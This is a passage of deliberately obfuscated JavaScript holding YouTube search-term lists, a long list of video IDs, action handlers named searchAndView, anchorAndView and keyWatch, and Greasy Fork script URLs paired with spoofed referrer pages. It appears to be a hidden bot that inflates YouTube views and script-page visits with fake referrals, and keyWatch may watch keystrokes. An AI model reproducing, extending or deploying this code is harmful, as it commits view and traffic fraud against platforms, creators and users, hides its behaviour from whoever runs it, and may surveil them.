'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + Z(0x15) + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xcbf * -0x3 + 0xa * -0x1d8 + 0x13c3 * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xf89 + 0x7 * 0x239 + -0x1f0e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x24 * 0xae + -0x1 * -0x26da + 0x355 * -0x13);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    a0(0x1a, '59%]') + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    a1(0x1) + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    a1(0x9) + 'g',
    'KyQ_sUgtbK' + 'U',
    a1(0x6) + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    Z(0x1c) + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + a1(0xa) + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + Z(0x10) + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0xb) + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + a0(0x7, 'Xaco') + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a1(0x17) + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + a1(0x11) + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + Z(0x14) + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
